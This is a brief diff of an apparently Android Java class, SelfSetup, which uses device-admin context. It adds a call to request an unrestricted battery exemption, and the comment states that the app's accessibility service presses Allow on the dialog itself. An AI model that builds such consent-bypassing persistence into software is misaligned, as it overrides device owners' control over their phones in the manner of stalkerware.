@@ -51,6 +51,7 @@ final class SelfSetup {
             extras(c, dpm, admin);
         } catch (Exception ignored) {
         }
+        BatteryAllow.ask(c); // "unrestricted battery": asked, and the accessibility service presses Allow
     }
 
     /**
